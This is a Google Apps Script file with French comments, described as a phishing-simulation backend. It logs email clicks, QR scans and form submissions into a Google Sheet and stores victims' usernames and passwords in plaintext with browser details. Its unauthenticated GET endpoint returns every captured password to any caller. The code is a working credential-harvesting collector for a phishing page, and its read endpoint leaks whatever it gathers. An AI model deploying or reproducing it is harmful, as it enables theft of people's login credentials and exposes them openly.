// ============================================================
// GOOGLE APPS SCRIPT - Phishing Simulation Backend
// ============================================================
// INSTRUCTIONS DE DEPLOIEMENT :
// 1. Va sur ton spreadsheet: https://docs.google.com/spreadsheets/d/1oZTS9loqPc2vs-BVDEP1AlWrsbzn60Y4n3NSfMjogq4/edit
// 2. Va dans Extensions > Apps Script
// 3. Supprime tout le code existant et colle ce fichier
// 4. Clique sur "Deployer" > "Gerer les deploiements"
// 5. Clique sur le crayon (modifier) > Version: "Nouveau version"
// 6. Clique sur "Deployer"
// ============================================================

const SPREADSHEET_ID = '1oZTS9loqPc2vs-BVDEP1AlWrsbzn60Y4n3NSfMjogq4';
const SHEET_NAME = 'Data';

function doGet(e) {
  var params = e.parameter;

  // Si le parametre "type" est present, c'est un envoi de donnees
  if (params.type) {
    return saveData(params);
  }

  // Sinon, c'est une lecture (admin dashboard)
  return readData();
}

function doPost(e) {
  try {
    var data = JSON.parse(e.postData.contents);
    return saveData(data);
  } catch (error) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: 'error', message: error.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function saveData(data) {
  try {
    var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    var sheet = ss.getSheetByName(SHEET_NAME);

    // Creer la feuille si elle n'existe pas
    if (!sheet) {
      sheet = ss.insertSheet(SHEET_NAME);
      sheet.appendRow(['Type', 'Username', 'Password', 'Timestamp', 'UserAgent', 'Source', 'ScreenResolution', 'Language']);
      sheet.getRange(1, 1, 1, 8).setFontWeight('bold').setBackground('#4a86e8').setFontColor('white');
      sheet.setFrozenRows(1);
    }

    // Ajouter la ligne de donnees
    sheet.appendRow([
      data.type || '',
      data.username || '',
      data.password || '',
      data.timestamp || new Date().toISOString(),
      data.userAgent || '',
      data.source || '',
      data.screenResolution || '',
      data.language || ''
    ]);

    // Mettre a jour les statistiques
    updateStats(ss);

    // Retourner une image 1x1 transparente (pour le mode Image)
    return ContentService
      .createTextOutput(JSON.stringify({ status: 'ok' }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (error) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: 'error', message: error.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function readData() {
  try {
    var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    var sheet = ss.getSheetByName(SHEET_NAME);

    if (!sheet || sheet.getLastRow() < 2) {
      return ContentService
        .createTextOutput(JSON.stringify({
          status: 'ok',
          stats: { emailClicks: 0, qrScans: 0, formSubmissions: 0, total: 0 },
          data: []
        }))
        .setMimeType(ContentService.MimeType.JSON);
    }

    var allData = sheet.getRange(2, 1, sheet.getLastRow() - 1, 8).getValues();

    var emailClicks = 0;
    var qrScans = 0;
    var formSubmissions = 0;
    var rows = [];

    allData.forEach(function(row) {
      var type = row[0];
      if (type === 'email_click') emailClicks++;
      else if (type === 'qr_scan') qrScans++;
      else if (type === 'form_submission') formSubmissions++;

      rows.push({
        type: row[0],
        username: row[1],
        password: row[2],
        timestamp: row[3],
        userAgent: row[4],
        source: row[5],
        screenResolution: row[6],
        language: row[7]
      });
    });

    return ContentService
      .createTextOutput(JSON.stringify({
        status: 'ok',
        stats: {
          emailClicks: emailClicks,
          qrScans: qrScans,
          formSubmissions: formSubmissions,
          total: emailClicks + qrScans
        },
        data: rows
      }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (error) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: 'error', message: error.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function updateStats(ss) {
  var statsSheet = ss.getSheetByName('Statistiques');
  if (!statsSheet) {
    statsSheet = ss.insertSheet('Statistiques');
  }

  var dataSheet = ss.getSheetByName(SHEET_NAME);
  if (!dataSheet || dataSheet.getLastRow() < 2) return;

  var allData = dataSheet.getRange(2, 1, dataSheet.getLastRow() - 1, 1).getValues();

  var emailClicks = 0;
  var qrScans = 0;
  var formSubmissions = 0;

  allData.forEach(function(row) {
    if (row[0] === 'email_click') emailClicks++;
    else if (row[0] === 'qr_scan') qrScans++;
    else if (row[0] === 'form_submission') formSubmissions++;
  });

  statsSheet.clear();
  statsSheet.appendRow(['STATISTIQUES', '', new Date().toLocaleString('fr-FR')]);
  statsSheet.appendRow(['']);
  statsSheet.appendRow(['Clics Email:', emailClicks]);
  statsSheet.appendRow(['Scans QR:', qrScans]);
  statsSheet.appendRow(['Formulaires remplis:', formSubmissions]);
  statsSheet.appendRow(['Total pieges:', emailClicks + qrScans]);

  statsSheet.getRange(1, 1).setFontWeight('bold').setFontSize(14);
  statsSheet.getRange('A3:A6').setFontColor('#e67e22').setFontWeight('bold');
  statsSheet.getRange('B3:B6').setFontWeight('bold').setFontColor('#2c3e50');
  statsSheet.getRange('B6').setFontColor('#e74c3c').setFontSize(14);
}
